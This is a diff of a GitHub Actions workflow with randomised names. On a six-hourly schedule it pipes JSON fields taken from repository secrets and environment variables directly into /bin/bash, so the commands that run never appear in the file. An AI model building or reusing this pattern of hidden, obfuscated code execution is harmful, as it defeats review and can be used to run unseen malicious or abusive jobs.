@@ -3,25 +3,25 @@ name: wangtesi6128
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 1/6 * * *'
+    - cron: '20 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wangtesi6128
         env:
-          tnrc435: ${{ secrets.tnrc435 }}
+          mvzyh47923: ${{ secrets.mvzyh47923 }}
         run: |
-          echo $tnrc435 | jq -r .kqjvm0928 | /bin/bash
-          echo $wv971 | jq -r .t5 | /bin/bash
-          echo $ylwnf97 | jq -r .d16 | /bin/bash
-          echo $pj01 | jq -r .va3 | /bin/bash
-          echo $ec47 | jq -r .cal0111 | /bin/bash
-          echo $wjpzy96731 | jq -r .xtfx503 | /bin/bash
-          echo $as02985 | jq -r .rqa7801 | /bin/bash
-          echo $xvrz099 | jq -r .zxie40074 | /bin/bash
-          echo $sj51225 | jq -r .n62 | /bin/bash
-          echo $hdgny26618 | jq -r .rqgz00701 | /bin/bash
+          echo $mvzyh47923 | jq -r .b4 | /bin/bash
+          echo $yeyeb5343 | jq -r .vljv1 | /bin/bash
+          echo $bwata6 | jq -r .bg08659 | /bin/bash
+          echo $r6 | jq -r .nrwh8231 | /bin/bash
+          echo $lmj17946 | jq -r .uxqq73 | /bin/bash
+          echo $di834 | jq -r .engf1263 | /bin/bash
+          echo $i548 | jq -r .o0 | /bin/bash
+          echo $f921 | jq -r .hxtsv12320 | /bin/bash
+          echo $r8 | jq -r .omg7 | /bin/bash
+          echo $g585 | jq -r .g981 | /bin/bash
 
